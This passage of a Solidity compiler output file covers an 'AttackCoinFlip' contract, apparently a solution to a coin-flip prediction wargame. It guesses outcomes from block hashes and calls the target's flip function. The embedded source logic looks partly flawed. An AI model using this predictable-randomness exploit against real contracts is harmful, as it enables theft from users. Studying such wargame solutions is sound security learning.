{
	"CoinFlip/attackCoinFlip.sol": {
		"AttackCoinFlip": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_contract",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "guessTheCurrentBlockValue",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "guessing",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "guessingValue",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"CoinFlip/attackCoinFlip.sol\":89:619  contract AttackCoinFlip{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip/attackCoinFlip.sol\":89:619  contract AttackCoinFlip{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3fe6dd29\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x79e41b39\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x99b084bf\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":214:488  function guessTheCurrentBlockValue() public returns(uint256){... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":494:616  function attack(address _contract) public {... */\n    tag_6:\n      tag_18\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      tag_21\n      jump\t// in\n    tag_18:\n      stop\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_8:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_12:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":214:488  function guessTheCurrentBlockValue() public returns(uint256){... */\n    tag_16:\n        /* \"CoinFlip/attackCoinFlip.sol\":266:273  uint256 */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":285:305  uint256 tmpOfCurrent */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":326:338  block.number */\n      number\n        /* \"CoinFlip/attackCoinFlip.sol\":316:339  blockhash(block.number) */\n      blockhash\n        /* \"CoinFlip/attackCoinFlip.sol\":308:340  uint256(blockhash(block.number)) */\n      0x00\n      shr\n        /* \"CoinFlip/attackCoinFlip.sol\":285:340  uint256 tmpOfCurrent = uint256(blockhash(block.number)) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":367:462  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      tag_23\n        /* \"CoinFlip/attackCoinFlip.sol\":384:461  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n      0x8000000000000000000000000000000000000000000000000000000000000000\n        /* \"CoinFlip/attackCoinFlip.sol\":367:379  tmpOfCurrent */\n      dup3\n        /* \"CoinFlip/attackCoinFlip.sol\":367:383  tmpOfCurrent.div */\n      tag_24\n      swap1\n        /* \"CoinFlip/attackCoinFlip.sol\":367:462  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_23:\n        /* \"CoinFlip/attackCoinFlip.sol\":351:364  guessingValue */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":351:462  guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":274:488  {... */\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":214:488  function guessTheCurrentBlockValue() public returns(uint256){... */\n      swap1\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":494:616  function attack(address _contract) public {... */\n    tag_21:\n        /* \"CoinFlip/attackCoinFlip.sol\":547:557  CoinFlip C */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":569:578  _contract */\n      dup2\n        /* \"CoinFlip/attackCoinFlip.sol\":547:579  CoinFlip C = CoinFlip(_contract) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":590:591  C */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":590:596  C.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CoinFlip/attackCoinFlip.sol\":597:605  guessing */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"CoinFlip/attackCoinFlip.sol\":590:606  C.flip(guessing) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_26\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_26:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_28:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":536:616  {... */\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":494:616  function attack(address _contract) public {... */\n      pop\n      jump\t// out\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_24:\n        /* \"Fallback/SafeMath.sol\":4027:4034  uint256 */\n      0x00\n        /* \"Fallback/SafeMath.sol\":4058:4059  b */\n      dup2\n        /* \"Fallback/SafeMath.sol\":4054:4055  a */\n      dup4\n        /* \"Fallback/SafeMath.sol\":4054:4059  a / b */\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n        /* \"Fallback/SafeMath.sol\":4047:4059  return a / b */\n      swap1\n      pop\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_34:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_35:\n        /* \"#utility.yul\":177:201   */\n      tag_52\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_34\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_10:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_54\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_35\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:532   */\n    tag_36:\n        /* \"#utility.yul\":476:483   */\n      0x00\n        /* \"#utility.yul\":519:524   */\n      dup2\n        /* \"#utility.yul\":512:525   */\n      iszero\n        /* \"#utility.yul\":505:526   */\n      iszero\n        /* \"#utility.yul\":494:526   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:532   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":538:647   */\n    tag_37:\n        /* \"#utility.yul\":619:640   */\n      tag_57\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":619:640   */\n      tag_36\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":614:617   */\n      dup3\n        /* \"#utility.yul\":607:641   */\n      mstore\n        /* \"#utility.yul\":538:647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":653:863   */\n    tag_14:\n        /* \"#utility.yul\":740:744   */\n      0x00\n        /* \"#utility.yul\":778:780   */\n      0x20\n        /* \"#utility.yul\":767:776   */\n      dup3\n        /* \"#utility.yul\":763:781   */\n      add\n        /* \"#utility.yul\":755:781   */\n      swap1\n      pop\n        /* \"#utility.yul\":791:856   */\n      tag_59\n        /* \"#utility.yul\":853:854   */\n      0x00\n        /* \"#utility.yul\":842:851   */\n      dup4\n        /* \"#utility.yul\":838:855   */\n      add\n        /* \"#utility.yul\":829:835   */\n      dup5\n        /* \"#utility.yul\":791:856   */\n      tag_37\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":653:863   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":950:1067   */\n    tag_39:\n        /* \"#utility.yul\":1059:1060   */\n      0x00\n        /* \"#utility.yul\":1056:1057   */\n      dup1\n        /* \"#utility.yul\":1049:1061   */\n      revert\n        /* \"#utility.yul\":1196:1322   */\n    tag_41:\n        /* \"#utility.yul\":1233:1240   */\n      0x00\n        /* \"#utility.yul\":1273:1315   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1266:1271   */\n      dup3\n        /* \"#utility.yul\":1262:1316   */\n      and\n        /* \"#utility.yul\":1251:1316   */\n      swap1\n      pop\n        /* \"#utility.yul\":1196:1322   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1328:1424   */\n    tag_42:\n        /* \"#utility.yul\":1365:1372   */\n      0x00\n        /* \"#utility.yul\":1394:1418   */\n      tag_65\n        /* \"#utility.yul\":1412:1417   */\n      dup3\n        /* \"#utility.yul\":1394:1418   */\n      tag_41\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1383:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1328:1424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1430:1552   */\n    tag_43:\n        /* \"#utility.yul\":1503:1527   */\n      tag_67\n        /* \"#utility.yul\":1521:1526   */\n      dup2\n        /* \"#utility.yul\":1503:1527   */\n      tag_42\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1496:1501   */\n      dup2\n        /* \"#utility.yul\":1493:1528   */\n      eq\n        /* \"#utility.yul\":1483:1546   */\n      tag_68\n      jumpi\n        /* \"#utility.yul\":1542:1543   */\n      0x00\n        /* \"#utility.yul\":1539:1540   */\n      dup1\n        /* \"#utility.yul\":1532:1544   */\n      revert\n        /* \"#utility.yul\":1483:1546   */\n    tag_68:\n        /* \"#utility.yul\":1430:1552   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1697   */\n    tag_44:\n        /* \"#utility.yul\":1604:1609   */\n      0x00\n        /* \"#utility.yul\":1642:1648   */\n      dup2\n        /* \"#utility.yul\":1629:1649   */\n      calldataload\n        /* \"#utility.yul\":1620:1649   */\n      swap1\n      pop\n        /* \"#utility.yul\":1658:1691   */\n      tag_70\n        /* \"#utility.yul\":1685:1690   */\n      dup2\n        /* \"#utility.yul\":1658:1691   */\n      tag_43\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1558:1697   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1703:2032   */\n    tag_20:\n        /* \"#utility.yul\":1762:1768   */\n      0x00\n        /* \"#utility.yul\":1811:1813   */\n      0x20\n        /* \"#utility.yul\":1799:1808   */\n      dup3\n        /* \"#utility.yul\":1790:1797   */\n      dup5\n        /* \"#utility.yul\":1786:1809   */\n      sub\n        /* \"#utility.yul\":1782:1814   */\n      slt\n        /* \"#utility.yul\":1779:1898   */\n      iszero\n      tag_72\n      jumpi\n        /* \"#utility.yul\":1817:1896   */\n      tag_73\n      tag_39\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1779:1898   */\n    tag_72:\n        /* \"#utility.yul\":1937:1938   */\n      0x00\n        /* \"#utility.yul\":1962:2015   */\n      tag_74\n        /* \"#utility.yul\":2007:2014   */\n      dup5\n        /* \"#utility.yul\":1998:2004   */\n      dup3\n        /* \"#utility.yul\":1987:1996   */\n      dup6\n        /* \"#utility.yul\":1983:2005   */\n      add\n        /* \"#utility.yul\":1962:2015   */\n      tag_44\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1952:2015   */\n      swap2\n      pop\n        /* \"#utility.yul\":1908:2025   */\n      pop\n        /* \"#utility.yul\":1703:2032   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2038:2154   */\n    tag_45:\n        /* \"#utility.yul\":2108:2129   */\n      tag_76\n        /* \"#utility.yul\":2123:2128   */\n      dup2\n        /* \"#utility.yul\":2108:2129   */\n      tag_36\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2101:2106   */\n      dup2\n        /* \"#utility.yul\":2098:2130   */\n      eq\n        /* \"#utility.yul\":2088:2148   */\n      tag_77\n      jumpi\n        /* \"#utility.yul\":2144:2145   */\n      0x00\n        /* \"#utility.yul\":2141:2142   */\n      dup1\n        /* \"#utility.yul\":2134:2146   */\n      revert\n        /* \"#utility.yul\":2088:2148   */\n    tag_77:\n        /* \"#utility.yul\":2038:2154   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2160:2297   */\n    tag_46:\n        /* \"#utility.yul\":2214:2219   */\n      0x00\n        /* \"#utility.yul\":2245:2251   */\n      dup2\n        /* \"#utility.yul\":2239:2252   */\n      mload\n        /* \"#utility.yul\":2230:2252   */\n      swap1\n      pop\n        /* \"#utility.yul\":2261:2291   */\n      tag_79\n        /* \"#utility.yul\":2285:2290   */\n      dup2\n        /* \"#utility.yul\":2261:2291   */\n      tag_45\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2160:2297   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2303:2648   */\n    tag_30:\n        /* \"#utility.yul\":2370:2376   */\n      0x00\n        /* \"#utility.yul\":2419:2421   */\n      0x20\n        /* \"#utility.yul\":2407:2416   */\n      dup3\n        /* \"#utility.yul\":2398:2405   */\n      dup5\n        /* \"#utility.yul\":2394:2417   */\n      sub\n        /* \"#utility.yul\":2390:2422   */\n      slt\n        /* \"#utility.yul\":2387:2506   */\n      iszero\n      tag_81\n      jumpi\n        /* \"#utility.yul\":2425:2504   */\n      tag_82\n      tag_39\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2387:2506   */\n    tag_81:\n        /* \"#utility.yul\":2545:2546   */\n      0x00\n        /* \"#utility.yul\":2570:2631   */\n      tag_83\n        /* \"#utility.yul\":2623:2630   */\n      dup5\n        /* \"#utility.yul\":2614:2620   */\n      dup3\n        /* \"#utility.yul\":2603:2612   */\n      dup6\n        /* \"#utility.yul\":2599:2621   */\n      add\n        /* \"#utility.yul\":2570:2631   */\n      tag_46\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2560:2631   */\n      swap2\n      pop\n        /* \"#utility.yul\":2516:2641   */\n      pop\n        /* \"#utility.yul\":2303:2648   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2654:2834   */\n    tag_47:\n        /* \"#utility.yul\":2702:2779   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2699:2700   */\n      0x00\n        /* \"#utility.yul\":2692:2780   */\n      mstore\n        /* \"#utility.yul\":2799:2803   */\n      0x12\n        /* \"#utility.yul\":2796:2797   */\n      0x04\n        /* \"#utility.yul\":2789:2804   */\n      mstore\n        /* \"#utility.yul\":2823:2827   */\n      0x24\n        /* \"#utility.yul\":2820:2821   */\n      0x00\n        /* \"#utility.yul\":2813:2828   */\n      revert\n        /* \"#utility.yul\":3026:3211   */\n    tag_33:\n        /* \"#utility.yul\":3066:3067   */\n      0x00\n        /* \"#utility.yul\":3083:3103   */\n      tag_87\n        /* \"#utility.yul\":3101:3102   */\n      dup3\n        /* \"#utility.yul\":3083:3103   */\n      tag_34\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":3078:3103   */\n      swap2\n      pop\n        /* \"#utility.yul\":3117:3137   */\n      tag_88\n        /* \"#utility.yul\":3135:3136   */\n      dup4\n        /* \"#utility.yul\":3117:3137   */\n      tag_34\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":3112:3137   */\n      swap3\n      pop\n        /* \"#utility.yul\":3156:3157   */\n      dup3\n        /* \"#utility.yul\":3146:3181   */\n      tag_89\n      jumpi\n        /* \"#utility.yul\":3161:3179   */\n      tag_90\n      tag_47\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":3146:3181   */\n    tag_89:\n        /* \"#utility.yul\":3203:3204   */\n      dup3\n        /* \"#utility.yul\":3200:3201   */\n      dup3\n        /* \"#utility.yul\":3196:3205   */\n      div\n        /* \"#utility.yul\":3191:3205   */\n      swap1\n      pop\n        /* \"#utility.yul\":3026:3211   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122076abf06b89f6738f5b63b9f4ee8f7fed0bed62e19e276f7bb6c81ede823ea62564736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506103bb806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80633fe6dd291461005157806379e41b391461006f57806399b084bf1461008d578063d018db3e146100ab575b600080fd5b6100596100c7565b60405161006691906101eb565b60405180910390f35b6100776100cd565b6040516100849190610221565b60405180910390f35b6100956100e0565b6040516100a291906101eb565b60405180910390f35b6100c560048036038101906100c0919061029f565b610127565b005b60005481565b600160009054906101000a900460ff1681565b600080434060001c905061011d7f8000000000000000000000000000000000000000000000000000000000000000826101bc90919063ffffffff16565b6000819055505090565b60008190508073ffffffffffffffffffffffffffffffffffffffff16631d263f67600160009054906101000a900460ff166040518263ffffffff1660e01b81526004016101749190610221565b6020604051808303816000875af1158015610193573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101b791906102f8565b505050565b600081836101ca9190610354565b905092915050565b6000819050919050565b6101e5816101d2565b82525050565b600060208201905061020060008301846101dc565b92915050565b60008115159050919050565b61021b81610206565b82525050565b60006020820190506102366000830184610212565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061026c82610241565b9050919050565b61027c81610261565b811461028757600080fd5b50565b60008135905061029981610273565b92915050565b6000602082840312156102b5576102b461023c565b5b60006102c38482850161028a565b91505092915050565b6102d581610206565b81146102e057600080fd5b50565b6000815190506102f2816102cc565b92915050565b60006020828403121561030e5761030d61023c565b5b600061031c848285016102e3565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061035f826101d2565b915061036a836101d2565b92508261037a57610379610325565b5b82820490509291505056fea264697066735822122076abf06b89f6738f5b63b9f4ee8f7fed0bed62e19e276f7bb6c81ede823ea62564736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3BB DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3FE6DD29 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x79E41B39 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x99B084BF EQ PUSH2 0x8D JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xAB JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x59 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x1EB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x77 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x95 PUSH2 0xE0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA2 SWAP2 SWAP1 PUSH2 0x1EB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xC0 SWAP2 SWAP1 PUSH2 0x29F JUMP JUMPDEST PUSH2 0x127 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 NUMBER BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x11D PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x1BC SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x174 SWAP2 SWAP1 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x193 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1B7 SWAP2 SWAP1 PUSH2 0x2F8 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1CA SWAP2 SWAP1 PUSH2 0x354 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1E5 DUP2 PUSH2 0x1D2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x200 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1DC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x21B DUP2 PUSH2 0x206 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x236 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x212 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x26C DUP3 PUSH2 0x241 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x27C DUP2 PUSH2 0x261 JUMP JUMPDEST DUP2 EQ PUSH2 0x287 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x299 DUP2 PUSH2 0x273 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2B5 JUMPI PUSH2 0x2B4 PUSH2 0x23C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2C3 DUP5 DUP3 DUP6 ADD PUSH2 0x28A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x206 JUMP JUMPDEST DUP2 EQ PUSH2 0x2E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x2F2 DUP2 PUSH2 0x2CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x30E JUMPI PUSH2 0x30D PUSH2 0x23C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x31C DUP5 DUP3 DUP6 ADD PUSH2 0x2E3 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x35F DUP3 PUSH2 0x1D2 JUMP JUMPDEST SWAP2 POP PUSH2 0x36A DUP4 PUSH2 0x1D2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x37A JUMPI PUSH2 0x379 PUSH2 0x325 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0xABF06B89F6738F5B63B9F4EE8F7FED0BED62E19E276F7B 0xB6 0xC8 0x1E 0xDE DUP3 RETURNDATACOPY 0xA6 0x25 PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
